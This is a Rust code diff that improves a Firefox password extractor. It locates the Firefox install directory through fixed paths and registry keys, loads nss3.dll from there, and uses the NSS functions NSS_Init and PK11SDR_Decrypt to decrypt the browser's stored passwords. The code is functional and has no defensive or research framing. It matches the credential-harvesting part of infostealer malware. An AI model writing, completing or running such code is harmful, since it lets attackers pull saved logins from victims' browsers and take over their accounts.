@@ -32,10 +32,16 @@ impl FirefoxPasswordExtractor {
             return true;
         }
 
-        // Try to load NSS library dynamically
-        match unsafe { libloading::Library::new("nss3.dll") } {
+        // Find Firefox installation directory
+        // nss3.dll is in the Firefox program directory, not the profile directory
+        let firefox_install_dir = Self::find_firefox_install_dir();
+        println!("[Firefox] Looking for nss3.dll in: {:?}", firefox_install_dir);
+
+        // Try to load NSS library from Firefox installation directory
+        let nss_path = firefox_install_dir.join("nss3.dll");
+        match unsafe { libloading::Library::new(&nss_path) } {
             Ok(nss_lib) => {
-                println!("[Firefox] Loaded nss3.dll successfully");
+                println!("[Firefox] Loaded nss3.dll successfully from {:?}", nss_path);
                 
                 // Get required function pointers
                 let nss_init: libloading::Symbol<NSSInitFunc> = match unsafe { nss_lib.get(b"NSS_Init") } {
@@ -67,10 +73,44 @@ impl FirefoxPasswordExtractor {
                 }
             }
             Err(e) => {
-                println!("[Firefox] Failed to load nss3.dll: {}", e);
+                println!("[Firefox] Failed to load nss3.dll from {:?}: {}", nss_path, e);
                 false
             }
         }
+    }
+
+    fn find_firefox_install_dir() -> std::path::PathBuf {
+        // Common Firefox installation paths
+        let paths = [
+            "C:\\Program Files\\Mozilla Firefox",
+            "C:\\Program Files (x86)\\Mozilla Firefox",
+        ];
+
+        for path in &paths {
+            let p = std::path::PathBuf::from(path);
+            if p.join("nss3.dll").exists() {
+                return p;
+            }
+        }
+
+        // Try to find via registry
+        if let Ok(key) = winreg::RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE)
+            .open_subkey("SOFTWARE\\Mozilla\\Mozilla Firefox")
+        {
+            if let Ok(current_version) = key.get_value::<String, _>("CurrentVersion") {
+                let main_key = format!("SOFTWARE\\Mozilla\\Mozilla Firefox\\{}\\Main", current_version);
+                if let Ok(main) = winreg::RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE)
+                    .open_subkey(&main_key)
+                {
+                    if let Ok(install_dir) = main.get_value::<String, _>("Install Directory") {
+                        return std::path::PathBuf::from(install_dir);
+                    }
+                }
+            }
+        }
+
+        // Fallback to default
+        std::path::PathBuf::from("C:\\Program Files\\Mozilla Firefox")
     }
 
     pub fn decrypt_data(&self, encrypted_b64: &str) -> Option<String> {
@@ -88,7 +128,7 @@ impl FirefoxPasswordExtractor {
         };
 
         // Create input SECItem
-        let mut input = SECItem {
+        let input = SECItem {
             sec_item_type: 0,
             data: encrypted_data.as_ptr() as *mut u8,
             len: encrypted_data.len() as u32,
@@ -101,12 +141,15 @@ impl FirefoxPasswordExtractor {
             len: 0,
         };
 
-        // Load PK11SDR_Decrypt function
+        // Load PK11SDR_Decrypt function from Firefox install directory
+        let firefox_install_dir = Self::find_firefox_install_dir();
+        let nss_path = firefox_install_dir.join("nss3.dll");
+        
         unsafe {
-            let nss_lib = match libloading::Library::new("nss3.dll") {
+            let nss_lib = match libloading::Library::new(&nss_path) {
                 Ok(lib) => lib,
                 Err(e) => {
-                    println!("[Firefox] Failed to reload nss3.dll for decrypt: {}", e);
+                    println!("[Firefox] Failed to reload nss3.dll for decrypt from {:?}: {}", nss_path, e);
                     return None;
                 }
             };
